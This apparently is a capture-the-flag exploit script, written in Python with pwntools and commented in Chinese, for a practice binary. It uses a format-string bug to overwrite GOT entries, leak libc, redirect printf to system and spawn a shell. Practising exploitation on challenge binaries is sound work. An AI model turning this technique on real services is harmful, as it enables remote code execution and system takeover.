from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/test_patch')

p = process('../file/test_patch')
libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')

# 0-9随机，多试几次就能进去
p.sendlineafter(b'enter:', b'3')

# 修改exit got地址为main函数中的地址0x400982，由于此时exit还没调用，因此其值为0x400726，我们只需修改两个字节
payload = b'%2434c%10$hn'.ljust(16, b'a') + p64(elf.got['exit'])
p.sendlineafter(b'slogan: \0', payload)

pause()

# 泄露libc地址，这里因为调用exit栈上多了一条数据，因此偏移量加1，2.35的libc调用printf时会因为这个偏移导致段错误
payload = b'%10$s'.ljust(8, b'a') + p64(elf.got['puts'])
p.sendlineafter(b'slogan: \0', payload)

# 本地
libc.address = u64(p.recvuntil(b'aaa', drop=True).ljust(8, b'\0')) - libc.sym['puts']
system_addr = libc.sym['system']
print('system address:', hex(system_addr))

# 远程
# libc = LibcSearcher('puts', u64(p.recvuntil(b'aaa', drop=True).ljust(8, b'\0')))
# system_addr = libc.dump('system')

# 修改printf got地址为system地址，因为此时printf已经被调用过，因此只需修改三个字节，其它字节的值和system是一样的
write_value = system_addr & 0xff
payload = '%' + str(write_value) + 'c%14$hhn'
write_value = ((system_addr & 0xffffff) >> 8) - write_value
payload += '%' + str(write_value) + 'c%15$hn'
payload = payload.encode().ljust(32, b'a') + p64(elf.got['printf']) + p64(elf.got['printf'] + 1)
p.sendlineafter(b'slogan: \0', payload)

# 调用printf('/bin/sh')，相当于调用system('/bin/sh')
p.sendlineafter(b'slogan: \0', b'/bin/sh')

p.interactive()